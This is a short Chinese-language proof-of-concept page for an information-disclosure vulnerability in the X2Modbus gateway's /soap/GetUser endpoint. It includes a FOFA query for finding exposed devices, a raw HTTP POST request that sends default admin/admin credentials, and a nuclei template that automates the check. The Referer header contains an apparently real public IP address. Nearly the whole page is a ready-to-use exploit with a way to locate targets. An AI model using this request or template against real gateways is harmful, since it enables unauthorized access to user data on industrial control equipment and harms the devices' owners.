## X2Modbus网关GetUser接口存在信息泄漏漏洞

## fofa
```
server="SunFull-Webs"
```

## poc
```
POST /soap/GetUser HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://60.12.13.234:880/login.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: language=zh-cn; username=admin1
If-Modified-Since: Sat Jun 29 10:02:08 2019
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

<GetUser><User Name="admin" Password="admin"/></GetUser>
```

![0efca01612b48aa66c17126e7be35e06](https://github.com/wy876/POC/assets/139549762/9a80e573-c806-48ed-a2f3-6d3b418c6efd)

## nuclei
```

id: X2Modbus-info

info:
  name: X2Modbus-info
  author: ly
  severity: low
  description: write your description here
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: e407656a54e1a881e89f488a3ae80223

http:
- method: POST
  path:
  - '{{RootURL}}/soap/GetUser'
  headers:
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cache-Control: max-age=0
    Connection: close
    Content-Length: "56"
    Content-Type: application/x-www-form-urlencoded
    Cookie: language=zh-cn; username=admin1
    If-Modified-Since: Sat Jun 29 10:02:08 2019
    Referer: http://60.12.13.234:880/login.html
    Upgrade-Insecure-Requests: "1"
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
      like Gecko) Chrome/121.0.0.0 Safari/537.36
  body: <GetUser><User Name="admin" Password="admin"/></GetUser>

  max-redirects: 3
  matchers-condition: and
  matchers:
  - id: 1
    type: status
    part: status
    status:
    - "200"
    condition: and

  - id: 1
    type: word
    part: body
    words:
    - admin
    condition: and

```
